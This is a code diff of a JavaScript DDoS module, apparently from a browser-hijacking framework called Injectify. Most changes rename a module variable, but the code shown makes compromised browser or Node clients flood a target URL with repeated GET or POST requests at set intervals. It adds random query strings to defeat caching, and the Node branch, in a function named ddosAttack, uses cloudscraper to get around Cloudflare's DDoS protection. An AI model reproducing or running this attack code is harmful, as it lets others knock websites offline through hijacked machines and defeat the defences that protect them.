@@ -1,9 +1,9 @@
-import Module from '../../definitions/module'
-declare const { module, injectify } : Module
+import ModuleTypings from '../../../definitions/module'
+declare const { Module, injectify } : ModuleTypings
 
 let request = {
   method: 'GET',
-  url: module.params,
+  url: Module.params,
   body: '',
   type: 'application/x-www-form-urlencoded',
   interval: 100,
@@ -25,8 +25,8 @@ let serialize = (obj) => {
 /**
  * Parse the parameters
  */
-if (typeof module.params == 'object') {
-  let { method, type, url, interval, random, params, body } = module.params
+if (typeof Module.params == 'object') {
+  let { method, type, url, interval, random, params, body } = Module.params
 
   if (method) request.method = method.toUpperCase()
   if (type) request.type = type
@@ -125,7 +125,7 @@ if (injectify.info.platform === 'browser') {
         req.src = url
         req.onload
       }, request.interval)
-      module.return(true)
+      Module.return(true)
     } else {
       if (request.method === 'POST' && request.type === 'application/x-www-form-urlencoded') {
         /**
@@ -181,18 +181,18 @@ if (injectify.info.platform === 'browser') {
           }
           XHR.send(request.body)
         })()
-        module.return(true)
+        Module.return(true)
       }
     }
   } else {
-    module.return(false)
+    Module.return(false)
   }
 } else {
   /**
    * NodeJS enabled client
    * Use cloudscraper to circumvent cloudflare DDoS prevention
    */
-  let cloudscraper = require('cloudscraper'); // leave the ;
+  let cloudscraper = eval(`require('cloudscraper')`);
   (function ddosAttack(thread) {
     let requestUrl = request.url
     if (request.random) requestUrl += `?${+new Date}`
